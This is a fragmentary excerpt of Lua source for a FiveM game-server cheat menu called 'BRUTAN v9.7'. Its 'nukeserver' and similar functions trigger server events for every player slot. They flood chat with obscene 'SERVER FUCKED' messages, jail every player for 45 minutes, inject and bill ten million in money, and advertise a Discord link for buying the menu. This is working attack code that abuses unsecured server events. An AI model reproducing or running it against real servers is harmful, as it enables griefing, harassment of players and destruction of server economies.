...
function RapeAllFunc()
    for bs=0,9 do
        TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"SERVER FUCKED BY BRUTAN TEAM")
    end
end
...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"SERVER FUCKED BY BRUTAN YOUTUBE")
        end
        ...
        for i=0,128 do
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, " Welcome BRUTAN v9.7 buy Mod Menu in https://discord.gg/zwfZHd6")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, " Welcome to BRUTAN v9.7 buy Mod Menu in https://discord.gg/zwfZHd6")
				TriggerServerEvent("esx-qalle-jail:updateJailTime_n96nDDU@X?@zpf8", GetPlayerServerId(i), 45 * 60, " Welcome BRUTAN V9.7 buy Mod Menu in https://discord.gg/zwfZHd6")
					end
				end
			...
			if esxdestroy then
				for i = 0, 128 do
						...
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Best BRUTAN v9.7 https://discord.gg/zwfZHd6", 10000000)
	...
	if sall then
			...
			if spam then
                for i = 0, 128 do
						TriggerServerEvent(
                    '_chat:messageEntered',
                    'FUCK SERVER by Brutan#7777',
                    {0, 0x99, 255},
                    'FUCK SERVER by Brutan#7777'
                )
                TriggerServerEvent('_chat:messageEntered', 'FUCK SERVER by Brutan#7777', {0, 0x99, 255}, 'FUCK SERVER by Brutan#7777')
                end
			end
...
Citizen.CreateThread(
	function()
		...
		TiagoMenu.CreateMenu("MainMenu", "BRUTAN ~n~~r~V9.7")
		TiagoMenu.SetSubTitle("MainMenu", "VERSION 9.7")
        ...
        while bm do
			...
			if TiagoMenu.IsMenuOpened("MainMenu") then
			    ...
			    drawNotification(" BRUTAN v9.7  ~n~~h~WELCOME ~r~[~s~ " ..GetPlayerName(PlayerId()).." ~r~]")
				...
				drawNotification("~h~~g~Official Discord: ~s~~n~~h~https://discord.gg/zwfZHd6 ~n~~r~Brutan#7777")
